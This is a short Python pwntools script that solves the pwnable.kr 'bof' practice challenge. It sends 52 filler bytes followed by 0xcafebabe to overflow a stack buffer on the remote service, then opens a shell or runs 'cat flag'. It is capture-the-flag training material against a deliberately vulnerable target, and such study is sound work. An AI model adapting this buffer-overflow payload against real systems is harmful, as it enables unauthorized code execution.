from pwn import *
import argparse

def get_flag(payload, is_interactive):
    shell = remote("pwnable.kr", 9000)
    shell.send(payload)

    if is_interactive:
        shell.interactive()
    else:
        for _ in range(2):
            shell.sendline(b"cat flag")
            flag = shell.recv(timeout=1).decode().strip()
        log.success(f"Flag: \"{flag}\"")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interactive", dest="interactive", action="store_true", required=False, help="Use an interactive shell.")

    args = parser.parse_args()
    # print(args)

    hex = 0xcafebabe
    offset = 52 # calculated by Assembly code
    payload = b"X" * offset + p32(hex)
    
    get_flag(payload, args.interactive)

if __name__ == "__main__":
    main()